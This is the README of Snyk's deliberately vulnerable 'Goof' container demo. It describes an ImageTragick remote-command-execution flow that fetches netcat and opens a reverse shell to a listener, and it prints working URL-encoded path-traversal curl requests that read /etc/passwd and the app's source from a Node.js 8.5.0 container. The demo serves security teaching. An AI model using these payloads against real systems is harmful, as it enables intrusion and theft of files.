# Goof - Snyk's application demo for breaking into containers

Purpose of this repository is to demonstrate a Node.js web application that is packaged as a container, and shows container-level vulnerabilities that result in breaking into the container.

Vulnerabilities and exploitation is:
- The vanilla Node.js base image `node:6.1.0-wheezy` ships with a vulnerable image of ImageMagick, specifically, ImageTragick CVE-2016-3714.
- In attempt to move away from the above base image, a user may turn into the latest Node.js 8 version, at the time being `8.5.0`. Except, there's a vulnerability in the Node.js 8.5.0 runtime - CVE-2017-14849.

Note: "at the time" is a fictional story for the purpose of a presentation/demo.

# Exploits

## ImageTragick CVE-2016-3714 - Image conversion utility leading to remote command execution

This exploit and application flow demonstrates how a high severity ImageMagic [CVE-2016-3714](https://snyk.io/vuln/SNYK-LINUX-IMAGEMAGICK-121787) improper input validation leads to remote command execution via "ImageTragick" vulnerability.

The exploit makes use of specially crafted image files which bypass the parsing functionality within the imagemagick utility that have further [whitelisted commands](https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L99) associated with instructions inside the image file. Escaping from the expected input context allows to inject system commands.

This repo includes a remote command execution exploit with a netcat download to achieve reverse shell in distributions that do not bundle netcat by default (such as Debian wheezy) and is based on proof-of-concepts exploits found in https://github.com/ImageTragick/PoCs.

### Install and Run

#### Requirements

- [Node.js](http://nodejs.org) 10 and npm
- The [serve](https://www.npmjs.com/package/serve) npm module installed globally to serve static files, or any other static files HTTP server (`npm install --global serve`)
- [Docker](https://www.docker.com)
- [netcat](https://catonmat.net/unix-utilities-netcat) networking unix utility to serve as a general-purpose network communication

#### Setup

- Clone this repository
- Build the docker image:

  ```
  docker build . -t rce
  ```

- Run the docker image and map the port 3112 from the container to the docker host:

  ```
  docker run --rm -p 3112:3112 --name rce rce
  ```

  Expected input should show the Node.js server has binded to the network interface successfully:

  ```
  npm info it worked if it ends with ok
  npm info using npm@3.8.6
  npm info using node@v6.1.0
  npm info lifecycle goof-container-breaking-in@1.0.0~prestart: goof-container-breaking-in@1.0.0
  npm info lifecycle goof-container-breaking-in@1.0.0~start: goof-container-breaking-in@1.0.0

  > goof-container-breaking-in@1.0.0 start /usr/src/goof
  > node index.js

  [1565780917497] INFO  (17 on e2b4f76a9de6): Server listening at http://0.0.0.0:3112
  ```

### ImageTragick Demo

- Spin up the local static server to serve the netcat package:

  ```
  cd exploits
  serve .
  ```

- Browse to `http://localhost:3112/public`, choose a picture to upload and click `resize` to assert the functionality is as expected - you should be redirected to the `result.html` page that shows the scaled image.

- Upload `exploits/rce1.jpg` provided in this repository and then connect to the running container to show that a new empty file called `rce1` was created on `/usr/src/goof`. Print the contents of the `exploits/rce1.jpg` file to show the exploit payload.

  Connecting to the running docker container:

  ```
  docker exec -it rce /bin/bash
  ```

- Run netcat in listening mode and wait for incoming connections:

  ```
  nc -lnv 3131
  ```

- Upload `exploits/rce2.jpg` provided in this repository, wait about 10-20 seconds for the netcat utility to be downloaded from the local static file server, compiled and executed to then create a reverse shell that allows you to interact with in the local netcat listening prompt


## Node.js 8.5.0 Insufficient Validation vulnerability

This exploit demonstrates a [path validation issue](https://snyk.io/vuln/SNYK-UPSTREAM-NODE-72352) found in the core `path` module for Node.js 8.5.0, which affects community modules, such as `send`, and can lead to path traversal vulnerability.

### Install and Run

Update the Dockerfile to use a 8.5.0 version of Node.js, such as:

```
FROM node:8.5.0
```

Rebuild the image, and run it:

```sh
docker build . -t rce --no-cache
docker run --rm -p 3112:3112 --name rce rce
```

#### Path Traversal Demo

Send the following request:

```sh
curl "http://localhost:3112/public/%2e%2e/%2e%2e/%2e%2e/foo/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

which retrieves the `/etc/passwd` file from inside the Docker container.

You can also just steal the source code for this application:

```sh
curl "http://localhost:3112/public/%2e%2e/%2e%2e/%2e%2e/foo/%2e%2e/%2e%2e/%2e%2e/%2e%2e/usr/src/goof/server.js"
```